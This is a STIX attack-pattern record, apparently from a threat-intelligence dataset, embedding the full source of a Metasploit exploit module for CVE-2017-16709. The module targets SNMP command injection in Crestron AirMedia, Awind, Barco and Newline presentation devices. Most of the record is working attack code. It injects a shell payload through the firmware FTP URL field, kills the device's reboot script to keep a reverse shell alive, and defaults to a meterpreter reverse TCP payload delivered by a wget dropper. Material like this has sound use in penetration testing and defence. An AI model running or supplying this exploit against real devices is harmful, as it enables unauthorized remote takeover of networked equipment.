{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--12767c07-6042-41b1-a50d-6ce9a08897f0",
    "created": "2024-08-14T16:58:21.16228Z",
    "modified": "2024-08-14T16:58:21.162284Z",
    "name": "\"AwindInc SNMP Service Command Injection\"",
    "description": " This module exploits a vulnerability found in AwindInc and OEM'ed products where untrusted inputs are fed to ftpfw.sh system command, leading to command injection. A valid SNMP read-write community is required to exploit this vulnerability.  The following devices are known to be affected by this issue:  * Crestron Airmedia AM-100 <= version 1.5.0.4 * Crestron Airmedia AM-101 <= version 2.5.0.12 * Awind WiPG-1600w <= version 2.0.1.8 * Awind WiPG-2000d <= version 2.1.6.2 * Barco wePresent 2000 <= version 2.1.5.7 * Newline Trucast 2 <= version 2.1.0.5 * Newline Trucast 3 <= version 2.1.3.7  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/snmp/awind_snmp_exec.rb",
            "external_id": "awind_snmp_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-16709"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/QKaiser/awind-research"
        },
        {
            "source_name": "reference",
            "url": "https://qkaiser.github.io/pentesting/2019/03/27/awind-device-vrd/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"AwindInc SNMP Service Command Injection\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in AwindInc and OEM'ed products where untrusted inputs are fed to ftpfw.sh system command, leading to command injection.\n        A valid SNMP read-write community is required to exploit this vulnerability.\n\n        The following devices are known to be affected by this issue:\n\n          * Crestron Airmedia AM-100 <= version 1.5.0.4\n          * Crestron Airmedia AM-101 <= version 2.5.0.12\n          * Awind WiPG-1600w <= version 2.0.1.8\n          * Awind WiPG-2000d <= version 2.1.6.2\n          * Barco wePresent 2000 <= version 2.1.5.7\n          * Newline Trucast 2 <= version 2.1.0.5\n          * Newline Trucast 3 <= version 2.1.3.7\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Quentin Kaiser <kaiserquentin[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-16709'],\n          ['URL', 'https://github.com/QKaiser/awind-research'],\n          ['URL', 'https://qkaiser.github.io/pentesting/2019/03/27/awind-device-vrd/']\n        ],\n      'DisclosureDate' => '2019-03-27',\n      'Platform'       => ['unix', 'linux'],\n      'Arch'           => [ARCH_CMD, ARCH_ARMLE],\n      'Privileged'     => true,\n      'Targets'        => [\n        ['Unix In-Memory',\n          'Platform'    => 'unix',\n          'Arch'        => ARCH_CMD,\n          'Type'        => :unix_memory,\n          'Payload'     => {\n            'Compat'    => {'PayloadType' => 'cmd', 'RequiredCmd' => 'openssl'}\n          }\n        ],\n        ['Linux Dropper',\n          'Platform'    => 'linux',\n          'Arch'        => ARCH_ARMLE,\n          'CmdStagerFlavor' => %w[wget],\n          'Type'        => :linux_dropper\n        ]\n      ],\n      'DefaultTarget'  => 1,\n      'DefaultOptions' => {'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp'}))\n\n    register_options(\n      [\n        OptString.new('COMMUNITY', [true, 'SNMP Community String', 'private']),\n      ])\n  end\n\n\n  def check\n    begin\n      connect_snmp\n      sys_description = snmp.get_value('1.3.6.1.2.1.1.1.0').to_s\n      print_status(\"Target system is #{sys_description}\")\n      # AM-100 and AM-101 considered EOL, no fix so no need to check version.\n      model = sys_description.scan(/Crestron Electronics (AM-100|AM-101)/).flatten.first\n      case model\n      when 'AM-100', 'AM-101'\n          return CheckCode::Vulnerable\n      else\n          # TODO: insert description check for other vulnerable models (that I don't have)\n          # In the meantime, we return 'safe'.\n          return CheckCode::Safe\n      end\n    rescue SNMP::RequestTimeout\n      print_error(\"#{ip} SNMP request timeout.\")\n    rescue Rex::ConnectionError\n      print_error(\"#{ip} Connection refused.\")\n    rescue SNMP::UnsupportedVersion\n      print_error(\"#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.\")\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e}\")\n    ensure\n      disconnect_snmp\n    end\n    Exploit::CheckCode::Unknown\n  end\n\n  def inject_payload(cmd)\n    begin\n      connect_snmp\n      varbind = SNMP::VarBind.new([1,3,6,1,4,1,3212,100,3,2,9,1,0],SNMP::OctetString.new(cmd))\n      resp = snmp.set(varbind)\n      if resp.error_status == :noError\n        print_status(\"Injection successful\")\n      else\n        print_status(\"OID not writable or does not provide WRITE access with community '#{datastore['COMMUNITY']}'\")\n      end\n    rescue SNMP::RequestTimeout\n      print_error(\"#{ip} SNMP request timeout.\")\n    rescue Rex::ConnectionError\n      print_error(\"#{ip} Connection refused.\")\n    rescue SNMP::UnsupportedVersion\n      print_error(\"#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.\")\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e}\")\n    ensure\n      disconnect_snmp\n    end\n  end\n\n  def trigger\n    begin\n      connect_snmp\n      varbind = SNMP::VarBind.new([1,3,6,1,4,1,3212,100,3,2,9,5,0],SNMP::Integer32.new(1))\n      resp = snmp.set(varbind)\n      if resp.error_status == :noError\n        print_status(\"Trigger successful\")\n      else\n        print_status(\"OID not writable or does not provide WRITE access with community '#{datastore['COMMUNITY']}'\")\n      end\n    rescue SNMP::RequestTimeout\n      print_error(\"#{ip} SNMP request timeout.\")\n    rescue Rex::ConnectionError\n      print_error(\"#{ip} Connection refused.\")\n    rescue SNMP::UnsupportedVersion\n      print_error(\"#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.\")\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e}\")\n    ensure\n      disconnect_snmp\n    end\n  end\n\n  def exploit\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    # The payload must start with a valid FTP URI otherwise the injection point is not reached\n    cmd = \"ftp://1.1.1.1/$(#{cmd.to_s})\"\n\n    # When the FTP download fails, the script calls /etc/reboot.sh and we loose the callback\n    # We therefore kill /etc/reboot.sh before it reaches /sbin/reboot with that command and\n    # keep our reverse shell opened :)\n    cmd << \"$(pkill -f /etc/reboot.sh)\"\n\n    # the MIB states that camFWUpgradeFTPURL must be 255 bytes long so we pad\n    cmd << \"A\" * (255-cmd.length)\n\n    # we inject our payload in camFWUpgradeFTPURL\n    print_status(\"Injecting payload\")\n    inject_payload(cmd)\n\n    # we trigger the firmware download via FTP, which will end up calling this\n    # \"/bin/getRemoteURL.sh %s %s %s %d\"\n    print_status(\"Triggering call\")\n    trigger\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-27",
    "x_mitre_platforms": [
        "linux'"
    ]
}